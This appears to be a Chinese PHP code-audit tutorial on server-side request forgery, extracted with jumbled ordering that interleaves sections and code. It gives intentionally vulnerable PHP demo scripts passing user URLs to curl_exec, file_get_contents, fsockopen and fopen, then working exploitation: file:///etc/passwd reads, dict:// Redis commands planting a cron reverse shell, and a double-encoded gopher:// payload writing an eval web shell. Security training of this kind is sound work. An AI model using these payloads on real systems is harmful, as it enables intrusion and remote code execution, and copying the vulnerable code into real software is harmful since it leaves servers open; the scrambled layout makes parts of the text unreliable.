@@ -1,0 +1,286 @@
+PHP 代码审计之 SSRF( 服务端请求伪造 )  
+1.SSRF 原理  
+Web 服务器经常需要从别的服务器获取数据，比如文件载入、图片拉取、图片识别等功能，如果获取数
+据的服务器地址可控，攻击者就可以通过 web 服务器自定义向别的服务器发出请求。因为 Web 服务器常
+搭建在 DMZ 区域，因此常被攻击者当作跳板，向内网服务器发出请求。
+2.SSRF 危害  
+①  内网信息收集 ( 如 Web 服务指纹识别、端口扫描、主机信息探测等 )
+②  通过构造 payload 攻击内网以及互联网应用（如 Redis 、 tomcat 、 fastcgi 、 Memcache ）
+③  通过伪协议进行攻击（ file 、 dict 、 gopher 、 http 、 https 、 telnet 、 ldap 等）
+3.SSRF 危险函数  
+SSRF 危险函数在 PHP 中大致有这么几个：
+curl_exec() 、 file_get_content() 、 fopen() 、 fsockopen()
+curl_exec()  
+一般使用该函数发起请求会用到libcurl库，该库支持如下协议 http 、 https 、 ftp 、 gopher 、 telnet 、
+dict 、 file 和 ldap 协议。
+libcurl库同  时也支持 HTTPS 认证、 HTTP POST 、 HTTP PUT 、  FTP 上传 ( 这个也能通过 PHP 的 FTP 扩展
+完成 ) 、 HTTP  基于表单的上传、代理、 cookies 和用户名 + 密码的认证。
+PHP 中使用 cURL 实现 Get 和 Post 请求的方法
+代码示例：
+demo.php
+我们传入url为 baidu 就可以成功执行一个 curl 会话并访问 baidu
+定义和用法：
+curl_exec — 执行一个 cURL 会话
+语法：
+mixed curl_exec ( resource $ch )
+执行给定的 cURL 会话。这个函数应该在初始化一个 cURL 会话并且全部的选项都被设置后被调用。
+$ch 由  curl_init() 返回的  cURL 句柄。
+返回值：
+成功时返回  TRUE ，  或者在失败时返回  FALSE 。  然而，如果  CURLOPT_RETURNTRANSFER 选项被设置，函
+数执行成功时会返回执行的结果，失败时返回  FALSE 。
+<?php
+highlight_file(__FILE__);    // 该代码的作用只是在前端高亮显示后端代码
+header("Content-Type: text/html; charset=utf-8");
+$url = $_REQUEST['url'];
+// 创建一个 cURL 资源
+$ch = curl_init();       // 初始化一个 curl 会话
+// 设置 URL 和相应的选项，更多选项可在 phpstorm 中使用使用 Ctrl+ 左键点击参数项进行查看
+curl_setopt($ch, CURLOPT_URL, $url);    // 获取 url 传递的参数
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // 如果不开启此选项则默认不跟随 302 跳
+转，除非代码中有 Location
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,0);  // 如果此选项被设置为 FALSE ，函数执行时会返
+回执行结果，如果为 true 的话需要使用 echo 等函数进行输出
+// 执行一个 curl 会话
+curl_exec($ch);
+// 关闭 cURL 资源，并且释放系统资源
+curl_close($ch);
+//echo $res;
+?>
+file_get_content()  
+该函数相较于 curl 代码更简洁，但是在访问速度以及支持协议来说并没有 curl 多。
+代码示例：
+我们传入url为 baidu 就可以通过 echo 回显 baidu 页面内容
+定义和用法 :
+该函数把整个文件读入一个字符串中，可获取本地文件也可获取远程文件。
+该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技
+术来增强性能。
+
+语法 :
+file_get_contents(path,include_path,context,start,max_length) 
+
+    path    必需。规定要读取的文件。
+    include_path    可选。如果您还想在  include_path （在  php.ini 中）中搜索文件的话，请设
+置该参数为  '1' 。
+    context     可选。规定文件句柄的环境。 context 是一套可以修改流的行为的选项。若使用 
+NULL ，则忽略。
+    start   可选。规定在文件中开始读取的位置。该参数是  PHP 5.1 中新增的。
+    max_length  可选。规定读取的字节数。该参数是  PHP 5.1 中新增的。
+返回值：
+成功将返回读入的字符串内容，失败则抛出异常。
+<?php
+highlight_file(__FILE__);    // 该代码的作用只是在前端高亮显示后端代码
+header("Content-Type: text/html; charset=utf-8");
+$url = $_REQUEST['url'];
+echo file_get_contents($url);   // 默认不回显内容需使用 echo 等函数进行输出
+?>
+fsockopen()  
+代码示例：
+定义和用法：
+用于打开网络的  Socket 链接。
+语法：
+int fsockopen(string hostname, int port, int [errno], string [errstr], int 
+[timeout]);
+    hostname  必填，这里需要填写需要访问主机名或 ip 地址
+    port 必填，这里所需填写主机名对应的端口
+    error_code 必填，这里返回网络中出现的错误号
+    error_message  必填，根据错误号返回错误信息
+    timeout 必填，设置网络请求的超时时间
+返回值：
+成功时返回整数
+<?php
+highlight_file(__FILE__);    // 该代码的作用只是在前端高亮显示后端代码
+header("Content-Type: text/html; charset=utf-8");
+$url = parse_url($_GET[url]);
+//var_dump($url);
+$fp = fsockopen("$url[host]", $url[port]?$url[port]:80, $errno, $errstr, 10);
+//echo $fp;
+if(!$fp)
+{
+echo "$errstr ($errno)<br>\n";
+}
+else {
+fputs($fp,"GET / HTTP/1.0\nHost: $url[host]\n\n");
+while(!feof($fp)) {
+echo fgets($fp,128);
+}
+fclose($fp);
+}
+parse_url
+通过fput()、fget()将内容写入并输出到页面，如果 fsockopen() 函数中 host 、 port 部分参数可控，
+就有可能造成 SSRF 。
+fopen()  
+?>
+定义及用法：
+该函数用于解析整个 URL ，并返回其组成部分。
+语法：
+array parse_url ( string url )
+    url  必填，需要输入需要请求的 url 地址
+返回值：
+此函数返回一个关联数组，包含现有  URL 的各种组成部分。如果缺少了其中的某一个，则不会为这个组成部
+分创建数组项。组成部分为：
+scheme - 如  http
+host
+port
+user
+pass
+path
+query - 在问号  ? 之后
+fragment - 在散列符号  # 之后
+此函数并不意味着给定的  URL 是合法的，它只是将上方列表中的各部分分开。 parse_url() 可接受不完整
+的  URL ，并尽量将其解析正确。此函数对相对路径的  URL 不起作用。
+代码示例：
+当传入的 url 参数可控时就可能造成 SSRF 。
+4.SSRF 中伪协议  
+定义和用法：
+该函数打开文件或者  URL 。
+语法：
+fopen(filename,mode,include_path,context)
+    filename    必需。规定要打开的文件或  URL 。
+    mode    必需。规定要求到该文件 / 流的访问类型。如： r 、 r+ 、 w 、 w+ 、 a 、 a+ 等。
+    include_path    可选。如果也需要在  include_path 中检索文件的话，可以将该参数设为  1 或 
+TRUE 。
+    context     可选。规定文件句柄的环境。 Context 是可以修改流的行为的一套选项。
+返回值：
+如果成功返回文件、 url 请求内容，如果打开失败，本函数返回  FALSE 。
+<?php
+highlight_file(__FILE__);    // 该代码的作用只是在前端高亮显示后端代码
+header("Content-Type: text/html; charset=utf-8");
+$url = $_GET['url'];
+$fp = fopen($url,"r");
+if(!$fp)
+{
+    echo "error<br>\n";
+}
+else {
+    while (!feof($fp)) {
+        echo fgets($fp, 128);
+    }
+}
+fclose($fp);
+?>
+file 协议  
+HTTP—— （ hypertext transfer protocol ）超文本传输协议  
+dict 协议  
+gopher 协议  
+sftp 协议  
+ldap:// 或 ldaps:// 或 ldapi:// 协议  
+5.SSRF 漏洞利用  
+5.1 端口及服务探测  
+我们还是使用如下代码进行测试
+其实很简单看到 file 的就是读取文件  格式： file:/// 文件路径
+GET—— 获取资源；
+POST—— 传输资源；
+PUT—— 更新资源；
+DELETE—— 删除资源；
+HEAD—— 获取报文首部；
+这个协议主要是数组的交互。是一种以键 - 值对形式存储数据的数据结构，就像电话号码簿中的名字和电话号码
+一样。这里的键是指你用来查找的东西，值是查找得到的结果
+gopher 协议是一种信息查找系统，他将 Internet 上的文件组织成某种索引，方便用户从 Internet 的一处带
+到另一处。在 WWW 出现之前， Gopher 是 Internet 上最主要的信息检索工具， Gopher 站点也是最主要的站
+点，使用 tcp70 端口。利用此协议可以攻击内网的
+Redis 、 Mysql 、 FastCGI 、 Ftp 等等，也可以发送  GET 、 POST 请求。这拓宽了  SSRF 的攻击面。
+Sftp 代表 SSH 文件传输协议（ SSH File Transfer Protocol ），或安全文件传输协议（ Secure File 
+Transfer Protocol ），这是一种与 SSH 打包在一起的单独协议，它运行在安全连接上，并以类似的方式进
+行工作。
+LDAP 代表轻量级目录访问协议。它是 IP 网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。
+<?php
+highlight_file(__FILE__);    // 该代码的作用只是在前端高亮显示后端代码
+header("Content-Type: text/html; charset=utf-8");
+$url = $_REQUEST['url'];
+// 创建一个 cURL 资源
+$ch = curl_init();       // 初始化一个 curl 会话
+// 设置 URL 和相应的选项，更多选项可在 phpstorm 中使用使用 Ctrl+ 左键点击参数项进行查看
+我们可以使用 Burp 中 intruder 模块对内网端口进行探测
+首先在 Intruder 模块中将端口设置为变量
+通过返回包length长度以及response响应来判断该端口是否开放
+curl_setopt($ch, CURLOPT_URL, $url);    // 获取 url 传递的参数
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // 如果不开启此选项则默认不跟随 302 跳
+转，除非代码中有 Location
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,0);  // 如果此选项被设置为 FALSE ，函数执行时会返
+回执行结果，如果为 true 的话需要使用 echo 等函数进行输出
+// 执行一个 curl 会话
+curl_exec($ch);
+// 关闭 cURL 资源，并且释放系统资源
+curl_close($ch);
+//echo $res;
+?>
+5.2 file 协议利用  
+如果代码中存在 echo 等回显条件我们可以通过 file 协议来读取本地任意文件，前提条件是知道文件的绝
+对路径。如果为 Linux 服务器的话利用方式也是一样的，如： file:///etc/passwd 。
+5.3 dict 协议利用  
+通过该协议可以查看服务的 banner 信息，通过收集到的信息扩大攻击面，如：
+dict://ip:6379/info查看 redis 相关信息，如内网搭建了 redis ，就可使用该协议进行信息收集，从而
+进一步利用。（ dict 协议也可通过发送指定命令来达到 redis getshell 的效果。
+dict://ip:22/查看 ssh 相关版本信息
+
+dict://ip:80查看 Web 服务相关信息
+dict://<host>:<port>/ 命令 : 参数   这里的 : 代表命令之间的空格   在 redis 未授权中可以使用如下命令
+进行 shell 获取
+dict://127.0.0.1:6379/config:set:dir:/var/spool/cron
+dict://127.0.0.1:6379/config:set:dbfilename:root
+dict://127.0.0.1:6379/set:1:nn*/1 * * * * bash -i >& /dev/tcp/ip/port 0>&1nn
+dict://127.0.0.1:6379/save
+详细可参考链接： https://www.cnblogs.com/wjrblogs/p/14456190.html
+5.4 gopher 协议利用  
+经典组合拳 SSRF+redis 未授权访问 Getshell, 记得在之前面试的时候被问到过。
+除了使用 redis 未授权，通过计划任务反弹 shell 以外，还可以通过 redis 写入文件，但需要知道该服务器
+web 绝对路径。
+redis 正常测试
+在 SSRF 中使用 gopher 协议可以直接向未授权的 redis 写入 shell
+payload
+gopher://192.168.230.138:6379/_
+*1
+$8
+flushall
+*3
+$3
+set
+$1
+1
+$39
+其中*n代表着一条命令的开始， n 表示该条命令由  n 个字符串组成；$n代表着该字符串有  n 个字符。
+由于后端服务器与浏览器分别要对内容进行一次 URL 解码，所以 payload 要经过两次 URL 编码：
+<?php @eval($_REQUEST['1ndex']); ?>
+*4
+$6
+config
+$3
+set
+$3
+dir
+$13
+/var/www/html
+*4
+$6
+config
+$3
+set
+$10
+dbfilename
+$10
+shell2.php
+*1
+$4
+save
+gopher%3A//xxx.xxx.xxx.xxx%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D
+%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%25
+2439%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_REQUEST%255B%25271
+ndex%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%2524
+6%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D
+%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Acon
+fig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%
+252410%250D%250Ashell2.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%25
+0A
+dict 与 gopher 协议最大的不同点在于 dict 必须依次进行命令的传入而不能一次执行所有命令，而
+gopher 协议则可以一条命令执行所有语句。
+6.SSRF 代码审计总结  
+
+在 PHP 代码审计中由于使用上述不安全函数且函数中内容可控导致的 SSRF 漏洞，在日常审计的过程中如果发现
+上述函数需多留意函数是否可控，在可控的条件下是否存在某些传参限制以及过滤条件这是需要我们在代码审
+计中细心观察的。
+在利用方法上多尝试利用伪协议来扩大战果以及漏洞危害性，这会在后续第四阶段实战项目中给大家进行实战
+分析利用。
